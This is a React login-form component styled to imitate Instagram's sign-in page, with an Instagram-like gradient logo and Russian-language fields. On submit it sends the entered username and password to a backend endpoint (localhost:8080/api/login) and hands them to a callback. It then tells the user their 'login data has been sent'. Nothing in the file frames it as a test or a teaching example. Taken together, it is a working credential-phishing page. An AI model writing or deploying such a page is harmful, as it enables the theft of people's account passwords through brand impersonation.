import { useState } from "react";

const styles = {
  page: {
    minHeight: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "#fafafa",
    fontFamily:
      "-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif",
    padding: 16,
  },
  wrap: { width: "100%", maxWidth: 350 },
  card: {
    background: "#fff",
    border: "1px solid #dbdbdb",
    borderRadius: 1,
    padding: "40px 40px 24px",
    textAlign: "center",
  },
  icon: { display: "flex", justifyContent: "center", margin: "10px 0 24px" },
  form: { display: "flex", flexDirection: "column", gap: 6 },
  input: {
    background: "#fafafa",
    border: "1px solid #dbdbdb",
    borderRadius: 3,
    padding: "9px 8px",
    fontSize: 14,
    color: "#262626",
    outline: "none",
  },
  button: (disabled) => ({
    marginTop: 8,
    background: disabled ? "#b2dffc" : "#0095f6",
    color: "#fff",
    border: "none",
    borderRadius: 8,
    padding: "9px 8px",
    fontSize: 14,
    fontWeight: 600,
    cursor: disabled ? "default" : "pointer",
  }),
  thanksTitle: { fontSize: 18, margin: "14px 0 6px", fontWeight: 600 },
  thanksText: { color: "#8e8e8e", fontSize: 14, margin: 0 },
};

function InstagramIcon() {
  return (
    <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
      <defs>
        <linearGradient id="ig-gradient" x1="0" y1="64" x2="64" y2="0">
          <stop offset="0%" stopColor="#feda75" />
          <stop offset="35%" stopColor="#d62976" />
          <stop offset="70%" stopColor="#962fbf" />
          <stop offset="100%" stopColor="#4f5bd5" />
        </linearGradient>
      </defs>
      <rect x="2" y="2" width="60" height="60" rx="16" fill="url(#ig-gradient)" />
      <rect x="16" y="16" width="32" height="32" rx="9" fill="none" stroke="#fff" strokeWidth="3" />
      <circle cx="32" cy="32" r="8" fill="none" stroke="#fff" strokeWidth="3" />
      <circle cx="42" cy="22" r="2" fill="#fff" />
    </svg>
  );
}

export default function LoginForm({ onSubmit }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [sent, setSent] = useState(false);

  const disabled = !username.trim() || !password.trim();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (disabled) return;

    await fetch("http://localhost:8080/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });

    onSubmit?.({ username, password });
    setSent(true);
  };

  return (
    <div style={styles.page}>
      <div style={styles.wrap}>
        <div style={styles.card}>
          {!sent ? (
            <>
              <div style={styles.icon}>
                <InstagramIcon />
              </div>
              <form style={styles.form} onSubmit={handleSubmit}>
                <input
                  style={styles.input}
                  type="text"
                  placeholder="Телефон, имя пользователя или адрес почты"
                  autoComplete="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
                <input
                  style={styles.input}
                  type="password"
                  placeholder="Пароль"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button type="submit" style={styles.button(disabled)} disabled={disabled}>
                  Отправить
                </button>
              </form>
            </>
          ) : (
            <div>
              <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                <circle cx="24" cy="24" r="23" stroke="#0095f6" strokeWidth="2" />
                <path
                  d="M14 24.5L20.5 31L34 17"
                  stroke="#0095f6"
                  strokeWidth="2.5"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              <h2 style={styles.thanksTitle}>Спасибо!</h2>
              <p style={styles.thanksText}>Данные для входа отправлены</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
